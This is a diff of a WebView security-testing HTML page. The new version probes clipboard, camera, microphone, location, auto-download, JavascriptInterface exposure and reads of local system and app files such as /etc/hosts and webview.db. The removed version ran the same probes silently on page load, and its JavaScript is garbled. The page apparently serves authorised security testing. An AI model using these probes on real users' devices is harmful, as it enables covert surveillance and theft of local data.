@@ -1,196 +1,329 @@
 <!DOCTYPE html>
-<html>
-  
-  <head>
-    <title>
-      Cross-Platform Exploit Test
-    </title>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Enhanced WebView Security Tester</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-      body { font-family: sans-serif; padding: 20px; } .hidden { display: none;
-      } .section { margin-bottom: 20px; } pre { background: #eee; padding: 10px;
-      overflow-x: auto; }
-    </style>
-  </head>
-  
-  <body onload="initiateExploits();">
-    <h1>
-      🔓 WebView Security Abuse (Android + iOS)
-    </h1>
-    <div class="section">
-      <h3>
-        📋 Clipboard Data:
-      </h3>
-      <div id="clipboardData" style="border: 1px dashed #999; padding: 10px; min-height: 50px;">
-      </div>
-    </div>
-    <div class="section">
-      <h3>
-        📷 Captured Camera Image:
-      </h3>
-      <video id="videoPreview" autoplay playsinline style="display: none;">
-      </video>
-      <img id="capturedImage" style="display: none;" />
-    </div>
-    <div class="section">
-      <h3>
-        🎤 Microphone Access:
-      </h3>
-      <div id="micStatus">
-        Waiting...
-      </div>
-    </div>
-    <div class="section">
-      <h3>
-        📍 Location:
-      </h3>
-      <div id="locationInfo">
-        Fetching location...
-      </div>
-    </div>
-    <div class="section">
-      <h3>
-        🧠 Device Fingerprint:
-      </h3>
-      <pre id="deviceInfo">
-      </pre>
-    </div>
-    <script>
-      function getClipboardData() {
-        if (navigator.clipboard && navigator.clipboard.readText) {
-          setInterval(() = >{
-            navigator.clipboard.readText().then(text = >{
-              if (text) document.getElementById('clipboardData').textContent = text;
-            }).
-            catch(err = >console.warn("Clipboard blocked:", err.message));
-          },
-          2000);
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            line-height: 1.6;
+            margin: 0;
+            padding: 20px;
+            background-color: #f4f4f9;
+            color: #333;
         }
-      }
+        .container { max-width: 800px; margin: auto; background: #fff; padding: 25px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+        h1, h2, h3 { color: #d9230f; }
+        h1 { text-align: center; }
+        .test-section { border: 1px solid #ddd; border-radius: 5px; padding: 15px; margin-bottom: 20px; }
+        .test-section h3 { margin-top: 0; }
+        .description { font-size: 0.9em; color: #555; margin-bottom: 10px; }
+        .status {
+            padding: 10px;
+            border-radius: 4px;
+            font-weight: bold;
+            font-family: "Courier New", Courier, monospace;
+            background-color: #e9ecef;
+            white-space: pre-wrap;
+            word-wrap: break-word;
+            min-height: 20px;
+        }
+        .status.success { background-color: #d4edda; color: #155724; border-color: #c3e6cb; }
+        .status.failure { background-color: #f8d7da; color: #721c24; border-color: #f5c6cb; }
+        .status.info { background-color: #cce5ff; color: #004085; border-color: #b8daff; }
+        #start-button {
+            display: block;
+            width: 100%;
+            padding: 15px;
+            font-size: 1.2em;
+            font-weight: bold;
+            color: #fff;
+            background-color: #28a745;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            margin-bottom: 20px;
+            transition: background-color 0.3s;
+        }
+        #start-button:hover { background-color: #218838; }
+        video, img { max-width: 100%; border-radius: 4px; display: none; margin-top: 10px;}
+        pre { background: #eee; padding: 10px; overflow-x: auto; border-radius: 4px; }
+    </style>
+</head>
+<body>
 
-      function requestCameraAccess() {
+<div class="container">
+    <h1>🔓 Enhanced WebView Security Tester</h1>
+    <p style="text-align: center;">This tool tests for common WebView misconfigurations on Android and iOS. A "Success" result indicates a potential security vulnerability.</p>
+
+    <button id="start-button" onclick="runAllTests()">▶️ Start All Tests</button>
+
+    <!-- Test Sections -->
+
+    <div class="test-section">
+        <h3>1. Local File Access (file://)</h3>
+        <p class="description">Attempts to read sensitive local files. Success here is a critical vulnerability, often enabled by `setAllowFileAccessFromFileURLs(true)` on Android.</p>
+        <div id="file-status" class="status">Waiting for test to start...</div>
+    </div>
+    
+    <div class="test-section">
+        <h3>2. Android JavascriptInterface Exploit</h3>
+        <p class="description">Tests for legacy, insecure Javascript Interfaces. If an object like "Android" or "JSInterface" is exposed, it could allow arbitrary native code execution.</p>
+        <div id="jsinterface-status" class="status">Waiting for test to start...</div>
+    </div>
+
+    <div class="test-section">
+        <h3>3. Clipboard Access</h3>
+        <p class="description">Attempts to silently read the user's clipboard content.</p>
+        <div id="clipboard-status" class="status">Waiting for test to start...</div>
+    </div>
+
+    <div class="test-section">
+        <h3>4. Camera Access & Capture</h3>
+        <p class="description">Requests camera access and tries to capture a photo without prolonged user interaction.</p>
+        <div id="camera-status" class="status">Waiting for test to start...</div>
+        <video id="videoPreview" autoplay playsinline></video>
+        <img id="capturedImage" alt="Captured Image" />
+    </div>
+
+    <div class="test-section">
+        <h3>5. Microphone Access</h3>
+        <p class="description">Requests access to the microphone to check if audio can be recorded.</p>
+        <div id="mic-status" class="status">Waiting for test to start...</div>
+    </div>
+
+    <div class="test-section">
+        <h3>6. Geolocation</h3>
+        <p class="description">Attempts to fetch the device's precise GPS coordinates.</p>
+        <div id="location-status" class="status">Waiting for test to start...</div>
+    </div>
+    
+    <div class="test-section">
+        <h3>7. Automatic File Download</h3>
+        <p class="description">Tries to force the download of a file. This can be used for phishing or delivering malicious payloads if the WebView auto-opens files.</p>
+        <div id="download-status" class="status">Waiting for test to start...</div>
+    </div>
+
+    <div class="test-section">
+        <h3>8. Device Fingerprinting</h3>
+        <p class="description">Collects non-permission based information to create a unique device fingerprint.</p>
+        <pre id="deviceInfo" class="status">Waiting for test to start...</pre>
+    </div>
+
+    <div style="margin-top: 30px; text-align: center; font-size: 0.8em; color: #777;">
+        <h2>Disclaimer</h2>
+        <p>This tool is for educational and authorized security testing purposes only. Do not use it on applications for which you do not have explicit permission to test.</p>
+    </div>
+
+</div>
+
+<script>
+    // ### UTILITY FUNCTIONS ###
+    function updateStatus(elementId, message, type) {
+        const el = document.getElementById(elementId);
+        el.textContent = message;
+        el.className = 'status ' + type;
+    }
+
+    // ### TEST FUNCTIONS ###
+
+    async function testLocalFileAccess() {
+        const statusElId = 'file-status';
+        updateStatus(statusElId, 'Testing various file paths...', 'info');
+        
+        const pathsToTest = [
+            // Common Android paths
+            'file:///etc/hosts',
+            'file:///proc/version',
+            'file:///sdcard/Download/secret.txt',
+            'file:///sdcard/secret.txt',
+            'file:///data/data/com.android.browser/databases/webview.db',
+            'file:///private/var/mobile/Library/Preferences/com.apple.springboard.plist'
+        ];
+        
+        let successes = [];
+        for (const path of pathsToTest) {
+            try {
+                const response = await fetch(path);
+                if (response.ok) {
+                    const content = await response.text();
+                    successes.push(`SUCCESS: Read ${path}\nContent: ${content.substring(0, 100)}...`);
+                }
+            } catch (e) {
+                // This is expected to fail most of the time
+                console.log(`Failed to fetch ${path}:`, e.message);
+            }
+        }
+
+        if (successes.length > 0) {
+            updateStatus(statusElId, successes.join('\n\n'), 'success');
+        } else {
+            updateStatus(statusElId, 'FAILURE: Could not read any local files. The WebView is likely secure against file:// access.', 'failure');
+        }
+    }
+
+    function testAndroidJavascriptInterface() {
+        const statusElId = 'jsinterface-status';
+        updateStatus(statusElId, 'Checking for common insecure interfaces...', 'info');
+        
+        const commonInterfaces = ['Android', 'JSInterface', 'WebView', 'android'];
+        let findings = [];
+
+        for (const iface of commonInterfaces) {
+            if (typeof window[iface] === 'object' && window[iface] !== null) {
+                const methods = Object.keys(window[iface]);
+                findings.push(`SUCCESS: Found Javascript Interface named "${iface}"!\nExposed methods: ${methods.join(', ') || '[None Found]'}`);
+            }
+        }
+
+        if (findings.length > 0) {
+            updateStatus(statusElId, findings.join('\n\n'), 'success');
+        } else {
+            updateStatus(statusElId, 'FAILURE: No common insecure Javascript Interfaces were found.', 'failure');
+        }
+    }
+
+    function testClipboard() {
+        const statusElId = 'clipboard-status';
+        updateStatus(statusElId, 'Attempting to read clipboard...', 'info');
+        
+        if (navigator.clipboard && navigator.clipboard.readText) {
+            navigator.clipboard.readText().then(text => {
+                if (text) {
+                    updateStatus(statusElId, `SUCCESS: Read clipboard content:\n\n"${text}"`, 'success');
+                } else {
+                    updateStatus(statusElId, 'SUCCESS: Clipboard access granted, but clipboard is empty.', 'info');
+                }
+            }).catch(err => {
+                updateStatus(statusElId, `FAILURE: Clipboard access denied. Error: ${err.message}`, 'failure');
+            });
+        } else {
+            updateStatus(statusElId, 'FAILURE: Clipboard API (navigator.clipboard.readText) is not available.', 'failure');
+        }
+    }
+
+    function testCamera() {
+        const statusElId = 'camera-status';
+        updateStatus(statusElId, 'Requesting camera permission...', 'info');
+        
         const video = document.getElementById('videoPreview');
         const img = document.getElementById('capturedImage');
 
-        if (navigator.mediaDevices ? .getUserMedia) {
-          navigator.mediaDevices.getUserMedia({
-            video: true
-          }).then(stream = >{
-            video.srcObject = stream;
-            video.style.display = 'block'; // Show video preview
-            setTimeout(() = >{
-              const canvas = document.createElement('canvas');
-              canvas.width = video.videoWidth;
-              canvas.height = video.videoHeight;
-              const ctx = canvas.getContext('2d');
-              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-              img.src = canvas.toDataURL('image/png');
-              img.style.display = 'block'; // Show captured image
-              stream.getTracks().forEach(t = >t.stop());
-              video.style.display = 'none'; // Hide video after capture
+        if (!navigator.mediaDevices?.getUserMedia) {
+            updateStatus(statusElId, 'FAILURE: Camera API (getUserMedia) not available.', 'failure');
+            return;
+        }
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                updateStatus(statusElId, 'SUCCESS: Camera permission granted. Capturing image in 2 seconds...', 'success');
+                video.srcObject = stream;
+                video.style.display = 'block';
+                setTimeout(() => {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+                    img.src = canvas.toDataURL('image/png');
+                    img.style.display = 'block';
+                    updateStatus(statusElId, `SUCCESS: Image captured!`, 'success');
+                    stream.getTracks().forEach(track => track.stop());
+                    video.style.display = 'none';
+                }, 2000);
+            })
+            .catch(err => {
+                updateStatus(statusElId, `FAILURE: Camera access denied. Error: ${err.message}`, 'failure');
+            });
+    }
+
+    function testMicrophone() {
+        const statusElId = 'mic-status';
+        updateStatus(statusElId, 'Requesting microphone permission...', 'info');
+
+        if (!navigator.mediaDevices?.getUserMedia) {
+            updateStatus(statusElId, 'FAILURE: Microphone API (getUserMedia) not available.', 'failure');
+            return;
+        }
+
+        navigator.mediaDevices.getUserMedia({ audio: true })
+            .then(stream => {
+                updateStatus(statusElId, 'SUCCESS: Microphone access was granted.', 'success');
+                stream.getTracks().forEach(track => track.stop());
+            })
+            .catch(err => {
+                updateStatus(statusElId, `FAILURE: Microphone access denied. Error: ${err.message}`, 'failure');
+            });
+    }
+
+    function testLocation() {
+        const statusElId = 'location-status';
+        updateStatus(statusElId, 'Requesting location...', 'info');
+
+        if (!navigator.geolocation) {
+            updateStatus(statusElId, 'FAILURE: Geolocation API not available.', 'failure');
+            return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+            pos => {
+                const coords = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude}, Accuracy: ${pos.coords.accuracy}m`;
+                updateStatus(statusElId, `SUCCESS: Location obtained.\n${coords}`, 'success');
             },
-            4000);
-          }).
-          catch(err = >{
-            console.error("Camera denied:", err.message);
-            // Optional: show a fallback or error message here
-          });
+            err => {
+                updateStatus(statusElId, `FAILURE: Location access denied. Error: ${err.message}`, 'failure');
+            }
+        );
+    }
+    
+    function testAutoDownload() {
+        const statusElId = 'download-status';
+        updateStatus(statusElId, 'Attempting to trigger file download...', 'info');
+        try {
+            const link = document.createElement("a");
+            link.href = "https://github.com/nmochea/gcash_poc/raw/refs/heads/main/secret.zip"; // Using a safe, known file
+            link.download = "potentially-unwanted-file.zip";
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+            updateStatus(statusElId, 'SUCCESS: Download was triggered. Check your device notifications or downloads folder. If the file downloaded without a prompt, this is a misconfiguration.', 'success');
+        } catch (err) {
+            updateStatus(statusElId, `FAILURE: Could not trigger download. Error: ${err.message}`, 'failure');
         }
-      }
+    }
 
-      function requestMicrophone() {
-        const micStatus = document.getElementById("micStatus");
-        if (navigator.mediaDevices ? .getUserMedia) {
-          navigator.mediaDevices.getUserMedia({
-            audio: true
-          }).then(stream = >{
-            micStatus.textContent = "🎙️ Microphone access granted";
-            stream.getTracks().forEach(t = >t.stop());
-          }).
-          catch(err = >{
-            micStatus.textContent = "🚫 Microphone access denied: " + err.message;
-          });
-        } else {
-          micStatus.textContent = "Microphone API not available";
-        }
-      }
-
-      function requestLocation() {
-        const output = document.getElementById("locationInfo");
-        if (navigator.geolocation) {
-          navigator.geolocation.getCurrentPosition(pos = >{
-            output.textContent = `Latitude: $ {
-              pos.coords.latitude
-            },
-            Longitude: $ {
-              pos.coords.longitude
-            }`;
-          },
-          err = >{
-            output.textContent = `Location denied: $ {
-              err.message
-            }`;
-          });
-        } else {
-          output.textContent = "Geolocation not supported";
-        }
-      }
-
-      function fingerprintDevice() {
+    function fingerprintDevice() {
         const info = {
           userAgent: navigator.userAgent,
-          language: navigator.language,
           platform: navigator.platform,
+          languages: navigator.languages?.join(', '),
           cores: navigator.hardwareConcurrency,
           memory: navigator.deviceMemory,
-          screen: `$ {
-            screen.width
-          }
-          x$ {
-            screen.height
-          }`
+          screenResolution: `${screen.width}x${screen.height}`,
+          colorDepth: screen.colorDepth,
+          touchPoints: navigator.maxTouchPoints
         };
         document.getElementById("deviceInfo").textContent = JSON.stringify(info, null, 2);
-      }
+        document.getElementById("deviceInfo").classList.add('info');
+    }
 
-      function autoDownloadRemoteFile() {
-        const link = document.createElement("a");
-        link.href = "https://github.com/nmochea/gcash_poc/raw/refs/heads/main/secret.zip";
-        link.download = "secret.zip";
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-      }
+    // ### MAIN CONTROLLER ###
+    function runAllTests() {
+        const button = document.getElementById('start-button');
+        button.disabled = true;
+        button.textContent = "🧪 Tests in Progress...";
 
-      function tryReadLocalFile() {
-        const frame = document.createElement('iframe');
-        frame.src = "file:///sdcard/secret.txt";
-        frame.style.width = "0";
-        frame.style.height = "0";
-        frame.style.border = "none";
-        document.body.appendChild(frame);
-
-        frame.onload = function() {
-          try {
-            const content = frame.contentWindow.document.body.innerText;
-            document.write("<pre>" + content + "</pre>");
-            console.log("FILE READ SUCCESS:", content);
-          } catch(err) {
-            console.warn("File read blocked:", err.message);
-          }
-        };
-      }
-
-      function initiateExploits() {
-        getClipboardData();
-        requestCameraAccess();
-        requestMicrophone();
-        requestLocation();
+        // Run all tests
+        testLocalFileAccess();
+        testAndroidJavascriptInterface();
+        testClipboard();
+        testCamera();
+        testMicrophone();
+        testLocation();
+        testAutoDownload();
         fingerprintDevice();
-        autoDownloadRemoteFile();
-        tryReadLocalFile();
-      }
-    </script>
-  </body>
+    }
+</script>
 
+</body>
 </html>
